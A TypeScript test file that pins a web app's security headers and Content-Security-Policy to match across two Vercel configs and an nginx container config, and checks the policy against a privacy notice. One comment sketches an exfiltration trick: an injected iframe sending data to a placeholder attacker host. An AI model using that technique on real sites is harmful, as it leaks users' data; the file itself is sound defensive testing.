// SPDX-License-Identifier: MPL-2.0
/**
 * Security headers must not drift between deployment paths.
 *
 * There are THREE places the same policy is expressed (SUSE assessment 2026-08, S2):
 *   1. vercel.json               — the live hosted deployment (project rootDirectory
 *                                  is the repo root, so this is the one that ships)
 *   2. shells/web/vercel.json    — a build rooted at the web shell instead
 *   3. deploy/docker/nginx.conf  — the self-hosted container
 *
 * Three copies of a security control is exactly how one of them silently loses a
 * directive. This test pins them together, and pins the directives that carry the
 * actual security value so a future edit cannot quietly drop one.
 *
 * Why the CSP is not strict: tool hooks run through `new Function` by design
 * (engine/src/runtime.ts), so `script-src` needs `unsafe-eval` and removing it
 * would break shipping tools. That is a documented, accepted residual risk. The
 * directive doing the work here is connect-src: script that CAN execute still
 * cannot exfiltrate to an arbitrary host.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (p: string): string => readFileSync(join(ROOT, p), 'utf8');

interface HeaderEntry { key: string; value: string }
interface VercelConfig { headers?: Array<{ source: string; headers: HeaderEntry[] }> }

function vercelHeaders(path: string): Record<string, string> {
  const cfg = JSON.parse(read(path)) as VercelConfig;
  const block = cfg.headers?.[0];
  assert.ok(block, `${path} has no headers block`);
  assert.equal(block.source, '/(.*)', `${path} headers must apply to every path`);
  return Object.fromEntries(block.headers.map(h => [h.key, h.value]));
}

/** Split a CSP string into { directive: [sources] }. */
function parseCsp(csp: string): Record<string, string[]> {
  const out: Record<string, string[]> = {};
  for (const part of csp.split(';')) {
    const [name, ...src] = part.trim().split(/\s+/);
    if (name) out[name] = src;
  }
  return out;
}

const rootHeaders = vercelHeaders('vercel.json');
const webHeaders = vercelHeaders('shells/web/vercel.json');
const nginx = read('deploy/docker/nginx.conf');

test('the two vercel.json header blocks are byte-identical', () => {
  assert.deepEqual(webHeaders, rootHeaders);
});

test('nginx serves the same CSP as vercel', () => {
  // The CSP lives in a map block so the several include sites cannot disagree.
  const m = nginx.match(/default\s+"(default-src[^"]+)"/);
  assert.ok(m, 'nginx.conf has no $lolly_csp map with a default-src policy');
  assert.equal(m![1], rootHeaders['Content-Security-Policy']);
});

test('the nginx header snippet carries the same four headers as vercel', () => {
  const snippet = read('deploy/docker/security-headers.conf');
  const keys = [...snippet.matchAll(/add_header\s+([A-Za-z-]+)/g)].map(m => m[1]);
  assert.deepEqual(new Set(keys), new Set(Object.keys(rootHeaders)));
  // The values that are literals (not the $lolly_csp variable) must match exactly.
  for (const key of ['Referrer-Policy', 'X-Content-Type-Options', 'Permissions-Policy']) {
    const m = snippet.match(new RegExp(`add_header\\s+${key}\\s+"([^"]+)"`));
    assert.ok(m, `${key} missing from security-headers.conf`);
    assert.equal(m![1], rootHeaders[key]);
  }
});

test('every nginx location that sets its own add_header re-includes the snippet', () => {
  // nginx DROPS inherited add_header directives in any location that declares one
  // of its own — the single most common way a header silently stops shipping.
  const locations = [...nginx.matchAll(/location\s+=?\s*([^\s{]+)\s*\{([^}]*)\}/g)]
    .map(m => ({ path: m[1] ?? '', body: m[2] ?? '' }));
  const offenders = locations
    .filter(l => /add_header/.test(l.body))
    .filter(l => !/include\s+\/etc\/nginx\/security-headers\.conf/.test(l.body))
    .map(l => l.path);
  assert.deepEqual(
    offenders, [],
    `these nginx locations set add_header without re-including security-headers.conf, so they ship without security headers: ${offenders.join(', ')}`,
  );
});

test('the snippet is copied into the image and kept out of auto-included conf.d', () => {
  const dockerfile = read('deploy/docker/web.Dockerfile');
  assert.match(dockerfile, /COPY\s+deploy\/docker\/security-headers\.conf\s+\/etc\/nginx\/security-headers\.conf/);
  // conf.d/*.conf is auto-included at http level by stock nginx; this file is
  // meant to apply only where it is explicitly included.
  assert.doesNotMatch(dockerfile, /security-headers\.conf\s+\/etc\/nginx\/conf\.d\//);
});

test('the directives that carry the security value are present', () => {
  const csp = parseCsp(rootHeaders['Content-Security-Policy']!);

  // connect-src is the one that contains an XSS: injected script cannot post
  // stolen data to an arbitrary host. It must NOT be absent and must NOT be '*'.
  assert.ok(csp['connect-src'], 'connect-src missing — the whole point of this CSP');
  assert.ok(!csp['connect-src'].includes('*'), 'connect-src must not be a wildcard');
  assert.ok(csp['connect-src'].includes("'self'"));

  // Free wins with no compatibility cost.
  assert.deepEqual(csp['object-src'], ["'none'"]);
  assert.deepEqual(csp['base-uri'], ["'none'"]);
  assert.ok(csp['frame-ancestors'], 'frame-ancestors missing (clickjacking)');
  assert.ok(!csp['frame-ancestors'].includes('*'), 'frame-ancestors must not be a wildcard');

  // frame-src is an EXFILTRATION directive here, not just a framing one. An
  // injected script cannot fetch to an arbitrary host (connect-src), but it can
  // append <iframe src="https://attacker/?d=…"> and the browser makes that
  // request — so a scheme-wide `https:` grant would hand back everything
  // connect-src is holding, which is this policy's entire stated value. The cost
  // of keeping it closed is community/url-shot's live composer preview, whose
  // capture path runs in the extension/desktop shell anyway.
  for (const dir of ['frame-src', 'child-src', 'worker-src'] as const) {
    assert.ok(csp[dir], `${dir} missing`);
    assert.ok(!csp[dir].includes('https:'), `${dir} must not carry a scheme-wide https: grant — it bypasses connect-src`);
    assert.ok(!csp[dir].includes('*'), `${dir} must not be a wildcard`);
  }
  assert.ok(!csp['img-src']?.includes('https:'), 'img-src must not carry a scheme-wide https: grant');

  // Referrer-Policy is a privacy control here, not only a security one: a tool URL
  // encodes every input value (docs/url-mode.md), so a Referer header would leak
  // the user's content to any third-party host they opt into contacting.
  assert.equal(rootHeaders['Referrer-Policy'], 'no-referrer');
  assert.equal(rootHeaders['X-Content-Type-Options'], 'nosniff');
  assert.ok(rootHeaders['Permissions-Policy']?.includes('geolocation=()'), 'geolocation must be denied outright');
});

test('script-src carries unsafe-eval WITH the reason recorded, not by accident', () => {
  const csp = parseCsp(rootHeaders['Content-Security-Policy']!);
  assert.ok(
    csp['script-src']?.includes("'unsafe-eval'"),
    "script-src must keep 'unsafe-eval' — tool hooks use new Function; removing it breaks shipping tools",
  );
  // If someone ever sandboxes hooks (the planned mitigation in the residual-risk
  // register), this assertion is the reminder to revisit the whole policy.
  assert.match(nginx, /new Function|hooks run via/i, 'nginx.conf must explain why unsafe-eval is present');
});

test('every host docs/privacy.md discloses is ALLOWED by the CSP', () => {
  // The direction that bites hardest. An egress host the app really uses, missing
  // from the policy, is a feature that works everywhere except the deployed build
  // — and it fails in the browser console, where nobody is looking. The ICC press
  // profiles (registry.color.org) were exactly this: documented, shipping, and
  // absent from the first draft of the policy.
  const privacy = read('docs/privacy.md');
  const csp = rootHeaders['Content-Security-Policy']!;
  // Hosts named in backticks in the egress table.
  const declared = [...privacy.matchAll(/`(?:\*\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)`/g)]
    .map(m => m[1] ?? '')
    .filter(h => /\.(com|org|net|io|dev|tools)$/.test(h))
    .filter(h => !h.endsWith('lolly.tools'));   // first-party, covered by 'self'
  assert.ok(declared.length >= 3, 'expected the egress table to name hosts in backticks');
  for (const host of new Set(declared)) {
    const wildcard = host.replace(/^[a-z0-9-]+\./, '*.');
    assert.ok(
      csp.includes(host) || csp.includes(wildcard),
      `docs/privacy.md says the app contacts ${host}, but the CSP does not allow it — that feature is broken on any deployment serving these headers`,
    );
  }
});

test('every third-party host in the CSP is one the privacy notice discloses', () => {
  // P1: the disclosure and the policy must agree. A new host in connect-src that
  // docs/privacy.md does not list is an undisclosed third-party contact.
  const csp = parseCsp(rootHeaders['Content-Security-Policy']!);
  const hosts = new Set<string>();
  for (const sources of Object.values(csp)) {
    for (const s of sources) {
      if (s.startsWith('https://')) hosts.add(s.replace('https://', '').replace(/^\*\./, ''));
    }
  }
  const privacy = read('docs/privacy.md');
  for (const host of hosts) {
    const family = host.split('.').slice(-2).join('.'); // somafm.com, googleapis.com…
    const named = privacy.includes(host)
      || privacy.includes(family)
      || (/google/.test(family) && /Google Font/i.test(privacy))
      || (/somafm/.test(family) && /radio/i.test(privacy));
    assert.ok(named, `CSP allows ${host} but docs/privacy.md never discloses it`);
  }
});
